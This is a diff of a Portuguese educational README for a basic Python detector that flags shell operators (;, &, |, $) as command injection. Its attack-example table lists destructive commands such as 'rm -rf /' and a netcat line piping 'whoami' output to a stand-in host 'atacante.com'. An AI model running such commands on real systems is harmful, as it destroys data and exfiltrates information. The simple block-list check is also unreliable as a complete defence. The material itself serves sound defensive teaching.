@@ -1,41 +1,53 @@
-# 🛡️ Solução Detalhada para a Detecção de Injeção de Comando
+# 🛡️ Detecção Simples de Injeção de Comando em Python
 
-O objetivo deste código é proteger o sistema validando a entrada do usuário. Ele funciona buscando por caracteres que, em um ambiente de shell de comando (como Linux ou Windows PowerShell), são usados para encadear ou modificar a execução de comandos, caracterizando uma tentativa de Injeção de Comando.
+Este é um exemplo educativo de como implementar uma defesa básica contra **Injeção de Comando** (Command Injection) em aplicações que executam comandos no sistema operacional via Python.
 
-## 🔍 O Que São Caracteres Suspeitos?
+## ⚠️ Objetivo
+Proteger o sistema impedindo que o usuário insira operadores de shell perigosos que permitam:
+- Executar múltiplos comandos
+- Rodar comandos em background
+- Fazer redirecionamento ou pipe
+- Acessar variáveis de ambiente ou executar comandos aninhados
 
-Os caracteres listados abaixo não são comandos por si só, mas sim operadores de controle que alteram o fluxo de execução de um sistema operacional. Ao proibir estes caracteres, a lógica impede que o usuário execute mais de um comando ou acesse variáveis de ambiente.
+## 🔍 Por que esses caracteres são perigosos?
 
-| Caractere | Função em um Shell                                       | Por que é Suspeito?                                            |
-|-----------|--------------------------------------------------------|--------------------------------------------------------------|
-| `;`       | Separador de comandos                                   | Permite executar um comando após o outro (ex: `cmd1; cmd2`). |
-| `&`       | Execução em background ou encadeamento (`&&`)         | Usado para iniciar processos ou executar comandos condicionalmente. |
-| `|`       | Pipe (Redirecionamento)                                | Interconecta a saída de um comando com a entrada de outro.    |
-| `$`       | Substituição de variável ou comando                    | Permite acessar dados sensíveis ou executar comandos aninhados (ex: `echo $PATH`). |
+| Caractere | Função no Shell                          | Exemplo de Ataque                          | Risco |
+|-----------|------------------------------------------|---------------------------------------------|-------|
+| `;`       | Separador de comandos                    | `ls; rm -rf /`                              | Executa comando extra |
+| `&` / `&&`| Execução em background ou condicional    | `ping 8.8.8.8 && rm -rf ~`                  | Comando condicional |
+| `|`       | Pipe (saída de um comando vira entrada)  | `whoami | nc atacante.com 4444`             | Exfiltração de dados |
+| `$`       | Expansão de variável ou comando          | `ls $(whoami)` ou `ls $PATH`                | Acesso a informações sensíveis |
 
-## 💻 Código com Explicação Integrada
+> Esses caracteres **não pertencem** a comandos simples e seguros como `ls -la`, `dir`, `cat arquivo.txt`, etc.
 
-O código Python abaixo implementa a lógica de verificação usando um loop simples para checar a presença desses operadores de risco.
+## 💻 Código Principal
 
 ```python
 def verificar_comando(comando):
-    # Lista de caracteres suspeitos que indicam uma tentativa de Injeção de Comando.
+    """
+    Verifica se o comando contém caracteres suspeitos usados em injeção de comando.
+    
+    Args:
+        comando (str): Comando fornecido pelo usuário
+    
+    Returns:
+        str: "Comando Seguro" ou "Comando Suspeito"
+    """
+    # Lista de operadores de shell que indicam risco de Command Injection
     caracteres_suspeitos = [';', '&', '|', '$']
-
-    # Inicia um loop para verificar cada caractere suspeito.
+    
+    # Verifica cada caractere suspeito
     for char in caracteres_suspeitos:
-        # A instrução 'if char in comando' é a verificação de segurança.
         if char in comando:
-            # Se for encontrado QUALQUER um dos caracteres de risco,
-            # o sistema retorna uma string de alerta e encerra a verificação.
-            return "Comando Suspeito"
+            return "Comando Suspeito ⚠️"
+    
+    # Se nenhum caractere perigoso for encontrado
+    return "Comando Seguro ✅"
 
-    # Se o loop terminar sem encontrar nenhum caractere suspeito, 
-    # o comando é considerado seguro para ser executado.
-    return "Comando Seguro"
 
 # --- Execução e Teste ---
-# 1. Entrada do usuário (recebe a string do comando a ser analisado)
-comando_usuario = input("Digite o comando a ser testado: ")
-# 2. Chama a função de segurança e imprime o resultado.
-print(verificar_comando(comando_usuario))
+if __name__ == "__main__":
+    print("🔍 Detector de Injeção de Comando\n")
+    comando_usuario = input("Digite o comando a ser analisado: ")
+    resultado = verificar_comando(comando_usuario)
+    print(f"\nResultado: {resultado}")
